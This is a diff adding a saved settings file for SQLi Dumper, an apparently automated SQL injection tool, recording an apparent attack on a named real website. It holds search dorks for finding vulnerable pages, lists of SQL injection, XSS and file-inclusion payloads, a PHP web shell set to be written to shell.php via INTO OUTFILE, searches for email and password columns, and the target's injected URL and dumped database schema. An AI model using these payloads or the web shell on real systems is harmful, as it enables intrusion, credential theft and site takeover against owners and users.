@@ -1,0 +1,262 @@
+﻿<?xml version="1.0" encoding="UTF-8"?>
+<SQLi_Dumper>
+  <Section Name="MainForm">
+    <Key Name="chkAnalizerPostgreErrorUnion" Value="True" />
+    <Key Name="cmbGUIHotKey" Value="A" />
+    <Key Name="txtHexValue" Value="" />
+    <Key Name="txtAccept" Value="Text/Html,Application/Xhtml Xml,Application/Xml;Q=0.9,*/*;Q=0.8 " />
+    <Key Name="txtResolveIP" Value="" />
+    <Key Name="cmbSkin" Value="Kemikal" />
+    <Key Name="txtTextValue" Value="" />
+    <Key Name="chkAnalizerMySQLErrorUnion" Value="True" />
+    <Key Name="numSearchColumnThreads" Value="10" />
+    <Key Name="chkAnalizeMsAcessSybase" Value="True" />
+    <Key Name="chkUpdater" Value="False" />
+    <Key Name="chkAnalizerOracleErrorUnion" Value="True" />
+    <Key Name="cmbGuiStyle" Value="Tabs" />
+    <Key Name="btnPause" Value="False" />
+    <Key Name="chkGroupChar" Value="True" />
+    <Key Name="chkAnalizerMSSQLErrorUnion" Value="True" />
+    <Key Name="txtMultiDorks" Value="inurl:article.php?ID=&#xD;&#xA;inurl:lay_old.php?id=" />
+    <Key Name="txtRFIurl" Value="http://www.google.com" />
+    <Key Name="txtNotepad" Value="&#xD;&#xA;&#xD;&#xA;" />
+    <Key Name="numHTTPRetry" Value="10" />
+    <Key Name="numHTTPTimeout" Value="20" />
+    <Key Name="txtExcludeUrlWords" Value="" />
+    <Key Name="txtRFIkeyword" Value="{window.google=" />
+    <Key Name="chkSkin" Value="True" />
+    <Key Name="txtResolveCountry" Value="" />
+    <Key Name="txtSQLCharDelimiter" Value="+ " />
+    <Key Name="cmbSQLChar" Value="Char" />
+    <Key Name="numLFIpathTraversalCount" Value="10" />
+    <Key Name="chkGUIHotKey" Value="False" />
+    <Key Name="chkExploitIgnoreCookies" Value="False" />
+    <Key Name="cmbUpdater" Value="" />
+    <Key Name="txtAnalizerExploitCode" Value="'[0]" />
+    <Key Name="txtUserAgent" Value="Mozilla/5.0 (Windows NT 10.0; WOW64; Rv:50.0) Gecko/20100101 Firefox/50.0 " />
+    <Key Name="txtSQLCharValue" Value="" />
+    <Key Name="numExploitingDelay" Value="200" />
+    <Key Name="cmbLanguages" Value="English" />
+    <Key Name="chkAnalizeMySQLReadWrite" Value="True" />
+    <Key Name="chkSysTray" Value="False" />
+    <Key Name="numAnalizerUnionEnd" Value="35" />
+    <Key Name="chkSkipHttpStatus4xx" Value="True" />
+    <Key Name="numPingPort" Value="80" />
+    <Key Name="txtResolveAddress" Value="" />
+    <Key Name="chkScanningBlackListProxy" Value="True" />
+    <Key Name="numThreads" Value="10" />
+    <Key Name="numAnalizerUnionSart" Value="1" />
+    <Key Name="chkAnalizeWAF" Value="True" />
+    <Key Name="numScanningDelay" Value="5000" />
+    <Key Name="chkLfiWindowsSkip" Value="True" />
+    <Key Name="Google.Domain" Value="com" />
+    <Key Name="DuckDuckGo.Domain" Value="com" />
+    <Key Name="Bing.Domain" Value="com" />
+    <Key Name="Yahoo.Domain" Value="com" />
+    <Key Name="Ask.Domain" Value="com" />
+    <Key Name="AOL.Domain" Value="com" />
+    <Key Name="WOW.Domain" Value="com" />
+    <Key Name="StartPage.Domain" Value="com" />
+    <Key Name="Yandex.Domain" Value="com" />
+    <Key Name="Rambler.Domain" Value="com" />
+    <Key Name="Search.Domain" Value="com" />
+    <Key Name="ThreadsScanner" Value="1" />
+    <Key Name="ThreadsExploit" Value="15" />
+    <Key Name="cmbSearchColumnType" Value="0" />
+    <Key Name="cmbSQLiSearch" Value="URL " />
+    <Key Name="cmbSQLiNoInjectableSearch" Value="0" />
+    <Key Name="cmbFileInclusaoSearch" Value="0" />
+    <Key Name="txtSQLiSearch" Value="" />
+    <Key Name="txtSQLiNoInjectableSearch" Value="" />
+    <Key Name="txtFileInclusaoSearch" Value="" />
+    <Key Name="btnSocksMyIP" Value="False" />
+    <Key Name="cmbSearchColumn" Value="email" />
+    <Key Name="cmbSearchColumn2" Value="password" />
+    <Key Name="cmbSearchColumn3" Value="" />
+    <Key Name="cmbSearchColumn4" Value="" />
+    <Key Name="chkSearchColumn" Value="True" />
+    <Key Name="chkSearchColumn2" Value="False" />
+    <Key Name="chkSearchColumn3" Value="False" />
+    <Key Name="chkSearchColumn4" Value="False" />
+    <Key Name="lstSearchEngine" Value="Google:True|DuckDuckGo:True|Bing:True|Yahoo:True|Ask:True|AOL:True|WOW:True|StartPage:True|Yandex:True|Rambler:True|Search:True|" />
+    <Key Name="lstExpoitType" Value="SQL:True|XSS:True|LFI:True|RFI:True|" />
+    <Key Name="lstAnalizerUnion" Value="' union all select [t] and '1'='1:True|999999.9 union all select [t]:True|999999.9 union all select [t]--:True| and 1'='1' union all select [t] and '1'='1:True| or 1'='1' union all select [t] and '1'='1:True|999999.9' union all select [t] and '1'='1:True|999999.9) union all select [t] and (1=1:True| and 1=1 union all select [t]:True| or 1=1 union all select [t]:True|" />
+    <Key Name="lstAnalizerError" Value="' and [t] and '1'='1:True|' or [t] and '1'='1:True|[t]:True| and 1=[t] and 1=1:True| or 1=[t] and 1=1:True|' and 1=[t] and '1'='1:True|' or 1=[t] and '1'='1:True|[t]--:True| and 1=[t] and 1=1--:True|" />
+    <Key Name="lvwLFIpathLinux" Value="/etc/passwd#root:/bin/bash|" />
+    <Key Name="lvwLFIpathWin" Value="c:\\boot.ini#default=multi(|d:\\boot.ini#default=multi(|c://boot.ini#default=multi(|d://boot.ini#default=multi(|" />
+    <Key Name="lvwWafs" Value="#%00|" />
+    <Key Name="lvwXSS" Value="&quot;&gt;&lt;script &gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;#XSS|&quot;&gt;&lt;javascript:alert(String.fromCharCode(88,83,83));&quot;&gt;#XSS|" />
+    <Key Name="lstExcludeUrlWords" Value="forum|showthread|.viewforum|.viewtopic|injection|dorks|union|hack|.gov|" />
+    <Key Name="txtRaw" Value="" />
+    <Key Name="chkDumpOrderBy" Value="False" />
+    <Key Name="chkDumpIFNULL" Value="True" />
+    <Key Name="cmbMethod" Value="GET" />
+    <Key Name="txtPassword" Value="" />
+    <Key Name="chkMSSQL_Latin1" Value="False" />
+    <Key Name="chkBypassProxy" Value="False" />
+    <Key Name="numLimitMax" Value="0" />
+    <Key Name="cmbOracleErrType" Value="GET_HOST_ADDRESS" />
+    <Key Name="txtCustomQuery" Value="" />
+    <Key Name="chkDumpWhere" Value="False" />
+    <Key Name="numTimeOut" Value="10" />
+    <Key Name="txtDictPath" Value="C:\Users\ANGEL\Desktop\ANGEL_ARCHIVOS\PROGRAMAS EXTRA\CUENTAS-RS\SQLDUMPER\SQLiDumper-AngelSecurityTeam\TXT\DicLoginFinder.txt" />
+    <Key Name="chkDumpFieldByField" Value="False" />
+    <Key Name="cmbMySQLErrType" Value="Double Query" />
+    <Key Name="txtSchemaOrderBy" Value="1 Asc, 2 Desc " />
+    <Key Name="txtCookies" Value="" />
+    <Key Name="chkMySQLSplitRows" Value="False" />
+    <Key Name="cmbMSSQLCast" Value="Nvarchar " />
+    <Key Name="chkReDumpFailed" Value="True" />
+    <Key Name="chkAddHearder" Value="False" />
+    <Key Name="trwSchema" Value="orveccom_website          [9 ]\core_pages                [? #      ?]|orveccom_website          [9 ]\directus_activity         [? #      ?]|orveccom_website          [9 ]\directus_media            [? #      ?]|orveccom_website          [9 ]\directus_messages         [? #      ?]|orveccom_website          [9 ]\directus_preferences      [? #      ?]|orveccom_website          [9 ]\directus_settings         [? #      ?]|orveccom_website          [9 ]\directus_users            [? #      ?]|orveccom_website          [9 ]\news                      [8 #      ?]\id\True|orveccom_website          [9 ]\news                      [8 #      ?]\active\False|orveccom_website          [9 ]\news                      [8 #      ?]\headline\False|orveccom_website          [9 ]\news                      [8 #      ?]\summary\False|orveccom_website          [9 ]\news                      [8 #      ?]\summary_image\False|orveccom_website          [9 ]\news                      [8 #      ?]\article\True|orveccom_website          [9 ]\news                      [8 #      ?]\article_image\False|orveccom_website          [9 ]\news                      [8 #      ?]\date\False|orveccom_website          [9 ]\product_copy              [? #      ?]" />
+    <Key Name="cmbCharCasing" Value="Normal" />
+    <Key Name="chkDumpEncodedHex" Value="False" />
+    <Key Name="numLimitX" Value="0" />
+    <Key Name="txtMySQLWriteFile" Value="'&lt;? System($_REQUEST['Cmd']); ?&gt;' " />
+    <Key Name="chkStopWhenDetects" Value="True" />
+    <Key Name="txtWebApps" Value="php;asp;html" />
+    <Key Name="numFieldByField" Value="1" />
+    <Key Name="numMaxRetry" Value="5" />
+    <Key Name="txtAddHeaderName" Value="" />
+    <Key Name="chkMSSQLCastAsChar" Value="True" />
+    <Key Name="numDelay" Value="200" />
+    <Key Name="chkAllInOneRequest" Value="True" />
+    <Key Name="chkOracleCastAsChar" Value="True" />
+    <Key Name="chkClearListOnGet" Value="False" />
+    <Key Name="numMaxRetryMultiThread" Value="100" />
+    <Key Name="numSleepMultiThread" Value="50" />
+    <Key Name="chkWebApps" Value="True" />
+    <Key Name="txtPost" Value="" />
+    <Key Name="numMySQLSplitRowsLenght" Value="40" />
+    <Key Name="txtCustomQueryFrom" Value="" />
+    <Key Name="cmbInjectionPoint" Value="URL" />
+    <Key Name="numMaxRetryColumn" Value="5" />
+    <Key Name="txtSearchColumnResult" Value="" />
+    <Key Name="txtSchemaWhere" Value="1=1 or Not 1=0 " />
+    <Key Name="txtAddHeaderValue" Value="" />
+    <Key Name="numMySQLSplitRows" Value="2" />
+    <Key Name="cmbOracleTopN" Value="ROWNUM" />
+    <Key Name="numSleep" Value="200" />
+    <Key Name="cmbMySQLCollations" Value="Unhex(Hex())" />
+    <Key Name="txtUserName" Value="" />
+    <Key Name="chkThreads" Value="False" />
+    <Key Name="txtSourceCode" Value="&lt;HTML&gt;&lt;/HTML&gt;&#x0;" />
+    <Key Name="chkHttpRedirect" Value="True" />
+    <Key Name="URL_List_Line" Value="1" />
+  </Section>
+  <Section Name="ProxyType">
+    <Key Name="cmbProxy" Value="WEB PROXY" />
+  </Section>
+  <Section Name="Statistics">
+    <Key Name="6" Value="Process Created§|Running Process§" />
+    <Key Name="3" Value="Unknown\Blocked§264|200 OK§1428|Rejected§1224|Failed to read handshake messages§3|500 InternalServerError§5|403 Forbidden§1407|429§4|404 NotFound§73|302 Redirect§28|503 ServiceUnavailable§345|400 BadRequest§4|407 ProxyAuthenticationRequired§86|406 NotAcceptable§348|Timed Out§24|Failed to read server hello§2|402 PaymentRequired§1|504 GatewayTimeout§1|DNS lookup failed§2|511§1|308§5|301 MovedPermanently§22|303 SeeOther§9|415 UnsupportedMediaType§102|409 Conflict§34|530§6|501 NotImplemented§1" />
+    <Key Name="2" Value="' and [t] and '1'='1§1|[t]§2|' union all select [t] and '1'='1§1" />
+  </Section>
+  <Section Name="SocksCheck">
+    <Key Name="numThreads" Value="50" />
+    <Key Name="btnPause" Value="False" />
+    <Key Name="numTimeout" Value="20" />
+  </Section>
+  <Section Name="Analizer">
+    <Key Name="txtURL" Value="" />
+    <Key Name="txtURL_Out" Value="" />
+    <Key Name="numUnionCount" Value="1" />
+    <Key Name="cmbUnion" Value="999999.9 union all select [t]--" />
+    <Key Name="txtUserName" Value="" />
+    <Key Name="chkWafs" Value="True" />
+    <Key Name="chkFlowRedirects" Value="True" />
+    <Key Name="txtPassword" Value="" />
+    <Key Name="chkBypassProxy" Value="False" />
+    <Key Name="btnGoToDumper" Value="True" />
+    <Key Name="txtRaw" Value="" />
+    <Key Name="cmbUnionPosition" Value="" />
+    <Key Name="txtSourceCode" Value="" />
+    <Key Name="cmbUnionStyle" Value="Numeric " />
+    <Key Name="txtUnionStyle" Value="~SQLI:[t]~" />
+    <Key Name="chkIE" Value="False" />
+  </Section>
+  <Section Name="LoginFinder">
+    <Key Name="" Value="http://www.orvec.com/" />
+    <Key Name="chkThreads" Value="False" />
+    <Key Name="txtCookies" Value="" />
+    <Key Name="txtAddHeaderValue" Value="" />
+    <Key Name="chkWebApps" Value="True" />
+    <Key Name="txtUserName" Value="" />
+    <Key Name="txtWebApps" Value="php;asp;html" />
+    <Key Name="chkHttpRedirect" Value="True" />
+    <Key Name="txtDictPath" Value="C:\Users\ANGEL\Desktop\ANGEL_ARCHIVOS\PROGRAMAS EXTRA\CUENTAS-RS\SQLDUMPER\SQLiDumper-AngelSecurityTeam\TXT\DicLoginFinder.txt" />
+    <Key Name="txtPassword" Value="" />
+    <Key Name="numThreads" Value="10" />
+    <Key Name="btnWorkerPause" Value="False" />
+    <Key Name="txtAddHeaderName" Value="" />
+    <Key Name="cmbCharCasing" Value="Normal" />
+    <Key Name="chkStopWhenDetects" Value="True" />
+    <Key Name="chkAddHearder" Value="False" />
+    <Key Name="numTimeOut" Value="10" />
+    <Key Name="numDelay" Value="200" />
+  </Section>
+  <Section Name="Dumper">
+    <Key Name="txtCookies" Value="" />
+    <Key Name="chkThreads" Value="False" />
+    <Key Name="cmbMethod" Value="GET" />
+    <Key Name="txtAddHeaderValue" Value="" />
+    <Key Name="numSleepMultiThread" Value="50" />
+    <Key Name="txtAddHeaderName" Value="" />
+    <Key Name="cmbMySQLErrType" Value="Double Query" />
+    <Key Name="numThreads" Value="10" />
+    <Key Name="chkMSSQL_Latin1" Value="False" />
+    <Key Name="txtCustomQueryFrom" Value="" />
+    <Key Name="chkReDumpFailed" Value="True" />
+    <Key Name="chkOracleCastAsChar" Value="True" />
+    <Key Name="chkDumpFieldByField" Value="False" />
+    <Key Name="numTimeOut" Value="10" />
+    <Key Name="txtMySQLWriteFile" Value="'&lt;? System($_REQUEST['Cmd']); ?&gt;' " />
+    <Key Name="cmbOracleErrType" Value="GET_HOST_ADDRESS" />
+    <Key Name="trwSchema" Value="orveccom_website          [9 ]\core_pages                [? #      ?]|orveccom_website          [9 ]\directus_activity         [? #      ?]|orveccom_website          [9 ]\directus_media            [? #      ?]|orveccom_website          [9 ]\directus_messages         [? #      ?]|orveccom_website          [9 ]\directus_preferences      [? #      ?]|orveccom_website          [9 ]\directus_settings         [? #      ?]|orveccom_website          [9 ]\directus_users            [? #      ?]|orveccom_website          [9 ]\news                      [8 #      8]\id\True|orveccom_website          [9 ]\news                      [8 #      8]\active\False|orveccom_website          [9 ]\news                      [8 #      8]\headline\False|orveccom_website          [9 ]\news                      [8 #      8]\summary\False|orveccom_website          [9 ]\news                      [8 #      8]\summary_image\False|orveccom_website          [9 ]\news                      [8 #      8]\article\True|orveccom_website          [9 ]\news                      [8 #      8]\article_image\False|orveccom_website          [9 ]\news                      [8 #      8]\date\True|orveccom_website          [9 ]\product_copy              [? #      ?]" />
+    <Key Name="numMySQLSplitRows" Value="2" />
+    <Key Name="chkHttpRedirect" Value="True" />
+    <Key Name="numLimitMax" Value="0" />
+    <Key Name="chkDumpEncodedHex" Value="False" />
+    <Key Name="numSleep" Value="200" />
+    <Key Name="chkDumpWhere" Value="False" />
+    <Key Name="numMySQLSplitRowsLenght" Value="40" />
+    <Key Name="numFieldByField" Value="1" />
+    <Key Name="cmbSqlType" Value="MySQL Union" />
+    <Key Name="numLimitX" Value="0" />
+    <Key Name="cmbMSSQLCast" Value="Nvarchar " />
+    <Key Name="chkAddHearder" Value="False" />
+    <Key Name="numMaxRetryMultiThread" Value="100" />
+    <Key Name="txtPassword" Value="" />
+    <Key Name="txtCustomQuery" Value="" />
+    <Key Name="cmbMySQLCollations" Value="Unhex(Hex())" />
+    <Key Name="chkClearListOnGet" Value="False" />
+    <Key Name="chkAllInOneRequest" Value="True" />
+    <Key Name="numMaxRetryColumn" Value="5" />
+    <Key Name="chkMySQLSplitRows" Value="False" />
+    <Key Name="chkDumpIFNULL" Value="True" />
+    <Key Name="cmbInjectionPoint" Value="URL" />
+    <Key Name="cmbOracleTopN" Value="ROWNUM" />
+    <Key Name="txtPost" Value="" />
+    <Key Name="tscSchemas" Value="" />
+    <Key Name="chkMSSQLCastAsChar" Value="True" />
+    <Key Name="txtUserName" Value="" />
+    <Key Name="chkDumpOrderBy" Value="False" />
+    <Key Name="txtSchemaWhere" Value="1=1 or Not 1=0 " />
+    <Key Name="numMaxRetry" Value="5" />
+    <Key Name="txtSchemaOrderBy" Value="1 Asc, 2 Desc " />
+    <Key Name="txtSearchColumnResult" Value="" />
+    <Key Name="" Value="http://www.orvec.com/news-article.php?id=5' union all select 1,2,3,4,5,6,[t],8 and '1'='1" />
+    <Key Name="lblVersion" Value="5.7.16" />
+    <Key Name="lblCountry" Value="[--] Unknown" />
+    <Key Name="lblCountBDs" Value="-1 " />
+    <Key Name="txtMySQLReadFilePath" Value="/etc/passwd" />
+    <Key Name="txtMySQLWriteFilePath" Value="'/home/www/HostName_com/html/shell.php'" />
+    <Key Name="cmbMySQLWriteFilePath" Value="INTO OUTFILE" />
+    <Key Name="cmbMySQLReadFile" Value="HEX" />
+    <Key Name="txtSearchColumn" Value="mail" />
+    <Key Name="chkSearchColumnAllDBs" Value="False" />
+    <Key Name="__CurrentDataBase" Value="orveccom_website" />
+    <Key Name="trwSchema.Selected" Value="orveccom_website:news:date" />
+    <Key Name="txtResult" Value="" />
+  </Section>
+</SQLi_Dumper>
